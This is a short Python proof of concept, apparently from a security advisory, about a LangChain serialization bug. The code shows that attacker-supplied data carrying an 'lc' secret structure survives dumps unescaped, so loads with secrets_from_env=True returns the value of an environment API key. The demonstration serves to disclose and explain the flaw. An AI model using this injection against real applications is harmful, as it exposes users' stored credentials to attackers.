import os

from langchain_core.load import dumps, loads

# Attacker injects secret structure into user-controlled data
attacker_dict = {
    "user_data": {
        "lc": 1,
        "type": "secret",
        "id": ["OPENAI_API_KEY"],
    }
}

serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key

os.environ["OPENAI_API_KEY"] = "sk-secret-key-12345"
deserialized = loads(serialized, secrets_from_env=True)

print(deserialized["user_data"])  # "sk-secret-key-12345" - SECRET LEAKED!
